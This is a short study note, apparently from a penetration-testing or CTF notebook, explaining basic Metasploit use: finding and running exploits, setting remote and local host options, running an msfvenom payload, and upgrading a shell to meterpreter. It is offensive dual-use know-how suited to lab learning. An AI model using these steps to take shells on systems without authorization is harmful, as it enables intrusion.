1. Basic metasploit

Metasploit is a tool designed to make hacking easier. The free version is 100% command based and easily detected by antivirus solutions nowadays so don't assume it'll work on boxes with antiviruses.

## Basic flow:
- `msfconsole` to start metasploit
- `search SEARCH TERM` to look through exploits
- `use EXPLOIT`
- Exploit can be either the full path like exploit/multi/handler or can be a number from a search
------
`options` shows the options. Set the options with `set OPTION VALUE` like `set RHOSTS 10.10.10.10`. Anything that starts with R is the remote machine and L is the local machine. RHOSTS vs RHOST: RHOST can only run against one machine at once while RHOSTS can run against multiple machines

-------
`run` to run the exploit. This may take some time, and sometimes exploits will just not work the first time.

--------
If you get a shell, most likely you will get a meterpreter shell. See the meterpreter note for help using meterpreter.


## Getting a metasploit shell from a simple reverse shell
See Basic msfvenom for how to do this. Use the elf payload for linux (`chmod +x shell.elf; ./shell.elf`) or the exe payload for windows and upload it using one of the methods in the File transfer note.

## Upgrading a simple shell to meterpreter
Note: this is only if you have a shell within metasploit that isn't meterpreter.
1. `background` or `^Z` to background the session.
2. `sessions` and get the session number
3. `use post/multi/manage/shell_to_meterpreter`
4. `options` and set the session to the session # and the LPORT to an unused port
5. `run` and you should see a new meterpreter session open. Your original shell may die but now you have a meterpreter shell! There is the off-chance that this will fail and the shell dies, just FYI
